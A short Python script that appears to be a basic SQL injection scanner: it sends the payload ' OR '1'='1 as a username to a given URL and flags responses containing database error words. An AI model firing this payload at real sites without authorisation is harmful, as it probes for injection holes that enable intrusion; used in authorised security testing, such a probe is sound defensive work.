import requests

payload = "' OR '1'='1"

def scan_sqli(url):

    params = {
        "username": payload,
        "password": "test"
    }

    response = requests.get(url, params=params)

    errors = [
        "sql",
        "syntax",
        "database"
    ]

    for error in errors:

        if error.lower() in response.text.lower():
            return True

    return False